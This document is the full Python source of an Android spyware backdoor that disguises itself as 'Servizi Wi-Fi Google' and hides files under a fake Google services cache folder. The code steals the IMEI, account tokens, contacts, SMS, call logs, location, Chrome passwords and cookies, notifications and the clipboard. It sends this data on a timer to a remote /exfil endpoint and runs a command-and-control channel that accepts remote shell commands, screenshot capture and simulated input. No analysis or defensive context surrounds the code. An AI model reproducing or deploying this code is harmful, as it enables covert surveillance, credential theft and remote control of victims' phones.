#!/usr/bin/env python3
"""Servizi Wi-Fi Google v3.0 - Backdoor stealth"""
import os, sys, json, base64, threading, time, subprocess, re
from datetime import datetime

STEALTH_DIR = "/sdcard/Android/data/com.google.android.gms/cache/.sys"
os.makedirs(STEALTH_DIR, exist_ok=True)

class DataExfiltrator:
    def __init__(self):
        self.results = {}
    
    def extract_all(self):
        self.results['device_info'] = self.extract_device_info()
        self.results['wifi_passwords'] = self.extract_wifi_passwords()
        self.results['accounts'] = self.extract_accounts()
        self.results['contacts'] = self.extract_contacts()
        self.results['sms'] = self.extract_sms()
        self.results['call_log'] = self.extract_call_log()
        self.results['location'] = self.extract_location()
        self.results['installed_apps'] = self.extract_installed_apps()
        self.results['browser_data'] = self.extract_browser_data()
        self.results['files'] = self.extract_interesting_files()
        self.results['notifications'] = self.extract_notifications()
        self.results['clipboard'] = self.extract_clipboard()
        
        with open(os.path.join(STEALTH_DIR, 'sync_cache.json'), 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        return self.results
    
    def extract_device_info(self):
        info = {}
        for p in ['ro.product.model','ro.product.manufacturer','ro.build.version.release','ro.serialno','gsm.operator.alpha','persist.sys.country']:
            try:
                r = subprocess.run(['getprop', p], capture_output=True, text=True, timeout=3)
                if r.stdout.strip(): info[p.split('.')[-1]] = r.stdout.strip()
            except: pass
        try:
            from jnius import autoclass
            TM, PA, CTX = autoclass('android.telephony.TelephonyManager'), autoclass('org.kivy.android.PythonActivity'), autoclass('android.content.Context')
            tm = PA.mActivity.getSystemService(CTX.TELEPHONY_SERVICE)
            info['imei'] = str(tm.getImei(0)) if hasattr(tm,'getImei') else str(tm.getDeviceId())
            info['phone'] = str(tm.getLine1Number()) or ''
        except: pass
        try:
            from jnius import autoclass
            AM, PA = autoclass('android.accounts.AccountManager'), autoclass('org.kivy.android.PythonActivity')
            for acc in AM.get(PA.mActivity).getAccounts():
                info['owner_email'] = str(acc.name)
                break
        except: pass
        return info
    
    def extract_wifi_passwords(self):
        pwds = []
        try:
            from jnius import autoclass
            CTX, PA = autoclass('android.content.Context'), autoclass('org.kivy.android.PythonActivity')
            wm = PA.mActivity.getSystemService(CTX.WIFI_SERVICE)
            configs = wm.getConfiguredNetworks()
            if configs:
                for i in range(configs.size()):
                    n = configs.get(i)
                    pwds.append({'ssid': str(n.SSID).strip('"'), 'bssid': str(n.BSSID)})
        except: pass
        try:
            r = subprocess.run(['cmd','wifi','list-networks'], capture_output=True, text=True, timeout=5)
            if r.returncode == 0: pwds.append({'method':'cmd_wifi','raw':r.stdout[:2000]})
        except: pass
        return pwds
    
    def extract_accounts(self):
        accts = []
        try:
            from jnius import autoclass
            AM, PA = autoclass('android.accounts.AccountManager'), autoclass('org.kivy.android.PythonActivity')
            for acc in AM.get(PA.mActivity).getAccounts():
                a = {'name': str(acc.name), 'type': str(acc.type)}
                try: a['token'] = str(AM.get(PA.mActivity).peekAuthToken(acc,'com.google'))[:50]
                except: pass
                accts.append(a)
        except: pass
        return accts
    
    def extract_contacts(self):
        cts = []
        try:
            from jnius import autoclass
            CR, Uri, PA = autoclass('android.content.ContentResolver'), autoclass('android.net.Uri'), autoclass('org.kivy.android.PythonActivity')
            c = PA.mActivity.getContentResolver().query(Uri.parse('content://com.android.contacts/data'),None,None,None,None)
            if c:
                while c.moveToNext():
                    try:
                        ct = {}
                        for col in ['display_name','data1','mimetype']:
                            idx = c.getColumnIndex(col)
                            if idx>=0: ct[col]=str(c.getString(idx) or '')
                        if ct: cts.append(ct)
                    except: pass
                c.close()
        except: pass
        return cts
    
    def extract_sms(self):
        sms = {'inbox':[]}
        try:
            from jnius import autoclass
            CR, Uri, PA = autoclass('android.content.ContentResolver'), autoclass('android.net.Uri'), autoclass('org.kivy.android.PythonActivity')
            c = PA.mActivity.getContentResolver().query(Uri.parse('content://sms/inbox'),None,None,None,'date DESC LIMIT 200')
            if c:
                while c.moveToNext():
                    try:
                        sms['inbox'].append({
                            'from': str(c.getString(c.getColumnIndex('address')) or ''),
                            'body': str(c.getString(c.getColumnIndex('body')) or '')[:200],
                            'date': str(c.getString(c.getColumnIndex('date')) or '')
                        })
                    except: pass
                c.close()
        except: pass
        return sms
    
    def extract_call_log(self):
        calls = []
        try:
            from jnius import autoclass
            CR, Uri, PA = autoclass('android.content.ContentResolver'), autoclass('android.net.Uri'), autoclass('org.kivy.android.PythonActivity')
            c = PA.mActivity.getContentResolver().query(Uri.parse('content://call_log/calls'),None,None,None,'date DESC LIMIT 200')
            if c:
                while c.moveToNext():
                    try:
                        calls.append({
                            'number': str(c.getString(c.getColumnIndex('number')) or ''),
                            'name': str(c.getString(c.getColumnIndex('name')) or ''),
                            'type': ['INCOMING','OUTGOING','MISSED'][int(c.getString(c.getColumnIndex('type')) or '1')-1],
                            'duration': str(c.getString(c.getColumnIndex('duration')) or ''),
                        })
                    except: pass
                c.close()
        except: pass
        return calls
    
    def extract_location(self):
        loc = {}
        try:
            from jnius import autoclass
            CTX, LM, PA = autoclass('android.content.Context'), autoclass('android.location.LocationManager'), autoclass('org.kivy.android.PythonActivity')
            lm = PA.mActivity.getSystemService(CTX.LOCATION_SERVICE)
            for p in ['gps','network','passive']:
                try:
                    l = lm.getLastKnownLocation(p)
                    if l:
                        loc[p] = {'lat': l.getLatitude(), 'lon': l.getLongitude(), 'accuracy': l.getAccuracy()}
                except: pass
        except: pass
        return loc
    
    def extract_installed_apps(self):
        apps = []
        try:
            from jnius import autoclass
            PM, PA, Intent = autoclass('android.content.pm.PackageManager'), autoclass('org.kivy.android.PythonActivity'), autoclass('android.content.Intent')
            pm = PA.mActivity.getPackageManager()
            for app in pm.getInstalledApplications(PM.GET_META_DATA):
                try:
                    ai = pm.getApplicationInfo(app.packageName, 0)
                    apps.append({'name': str(pm.getApplicationLabel(ai)), 'package': str(app.packageName)})
                except: pass
        except: pass
        return apps
    
    def extract_browser_data(self):
        browser = {}
        for p in ['/data/data/com.android.chrome/app_chrome/Default/Login Data',
                   '/data/data/com.android.chrome/app_chrome/Default/Cookies',
                   '/data/data/com.android.chrome/app_chrome/Default/History']:
            if os.path.exists(p):
                try:
                    import shutil
                    dest = os.path.join(STEALTH_DIR, 'chrome', os.path.basename(p))
                    os.makedirs(os.path.dirname(dest), exist_ok=True)
                    shutil.copy2(p, dest)
                    browser[os.path.basename(p)] = 'copiato'
                except: pass
        return browser
    
    def extract_interesting_files(self):
        files = []
        for pat,lim in [('DCIM/Camera/*.jpg',10),('Pictures/Screenshots/*.png',10),('Download/*.pdf',10)]:
            try:
                r = subprocess.run(['find','/sdcard','-path',f'*/{pat}','-type','f','-size','-5M'],capture_output=True,text=True,timeout=15)
                for f in r.stdout.strip().split('\n')[:lim]:
                    if f: files.append(f)
            except: pass
        return files
    
    def extract_notifications(self):
        notifs = []
        try:
            r = subprocess.run(['dumpsys','notification','--noredact'],capture_output=True,text=True,timeout=5)
            for nb in r.stdout.split('NotificationRecord')[1:]:
                pkg = re.search(r'pkg=(\S+)', nb)
                txt = re.search(r'text=(.*?)(?:\n|$)', nb, re.DOTALL)
                if pkg: notifs.append({'pkg':pkg.group(1),'text':txt.group(1).strip()[:200] if txt else ''})
        except: pass
        return notifs
    
    def extract_clipboard(self):
        try:
            from jnius import autoclass
            CTX, PA = autoclass('android.content.Context'), autoclass('org.kivy.android.PythonActivity')
            cd = PA.mActivity.getSystemService(CTX.CLIPBOARD_SERVICE).getPrimaryClip()
            if cd and cd.getItemCount()>0: return str(cd.getItemAt(0).getText() or '')
        except: pass
        return ''

class StealthService:
    def __init__(self):
        self.running = True
        self.exfil = DataExfiltrator()
        self.server = '192.168.43.1'
        try:
            r = subprocess.run(['ip','route'],capture_output=True,text=True,timeout=5)
            for l in r.stdout.split('\n'):
                if 'default via' in l: self.server=l.split()[2]; break
        except: pass
    
    def start(self):
        print(f"[*] Servizi Wi-Fi Google avviato")
        print(f"[*] Server: {self.server}")
        threading.Thread(target=self._periodic_exfil, daemon=True).start()
        threading.Thread(target=self._connect_c2, daemon=True).start()
        while self.running: time.sleep(10)
    
    def _periodic_exfil(self):
        while self.running:
            try:
                data = self.exfil.extract_all()
                import urllib.request
                urllib.request.urlopen(urllib.request.Request(
                    f"http://{self.server}:8080/exfil",
                    data=json.dumps({'data':data}).encode(),
                    headers={'Content-Type':'application/json'}), timeout=10)
            except: pass
            time.sleep(300)
    
    def _connect_c2(self):
        import asyncio
        try:
            import websockets
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            async def c():
                while self.running:
                    try:
                        async with websockets.connect(f"ws://{self.server}:8765") as ws:
                            await ws.send(json.dumps({
                                'type':'register',
                                'device_id': subprocess.run(['getprop','ro.serialno'],capture_output=True,text=True).stdout.strip()[:8],
                                'model': subprocess.run(['getprop','ro.product.model'],capture_output=True,text=True).stdout.strip(),
                                'android': subprocess.run(['getprop','ro.build.version.release'],capture_output=True,text=True).stdout.strip(),
                            }))
                            while self.running:
                                m = json.loads(await asyncio.wait_for(ws.recv(), timeout=30))
                                if m.get('type')=='command':
                                    a, p = m.get('action',''), m.get('params','')
                                    if a=='exfil':
                                        d = self.exfil.extract_all()
                                        await ws.send(json.dumps({'type':'exfiltration_report','data':json.dumps(d,default=str)}))
                                    elif a=='shell':
                                        r = subprocess.run(p,shell=True,capture_output=True,text=True,timeout=30)
                                        await ws.send(json.dumps({'type':'shell_output','output':r.stdout[:5000]}))
                                    elif a=='screenshot':
                                        r = subprocess.run(['screencap','-p',os.path.join(STEALTH_DIR,'s.png')],capture_output=True,timeout=10)
                                        if r.returncode==0:
                                            with open(os.path.join(STEALTH_DIR,'s.png'),'rb') as f:
                                                await ws.send(json.dumps({'type':'screen','data':base64.b64encode(f.read()).decode()}))
                                    elif a=='tap':
                                        x,y=map(int,p.split()); subprocess.run(['input','tap',str(x),str(y)],timeout=3)
                                    elif a=='text': subprocess.run(['input','text',p],timeout=3)
                                    elif a=='key':
                                        km={'home':'3','back':'4','menu':'82','power':'26','volup':'24','voldown':'25','enter':'66'}
                                        subprocess.run(['input','keyevent',km.get(p,p)],timeout=3)
                    except: await asyncio.sleep(5)
            loop.run_until_complete(c())
        except:
            import urllib.request
            while self.running:
                try:
                    resp = urllib.request.urlopen(f"http://{self.server}:8080/poll", timeout=10)
                    if resp.status==200:
                        m = json.loads(resp.read())
                        if m.get('action')=='exfil': self.exfil.extract_all()
                except: pass
                time.sleep(5)

if __name__=='__main__':
    print("[*] Servizi Wi-Fi Google in esecuzione ✓")
    StealthService().start()
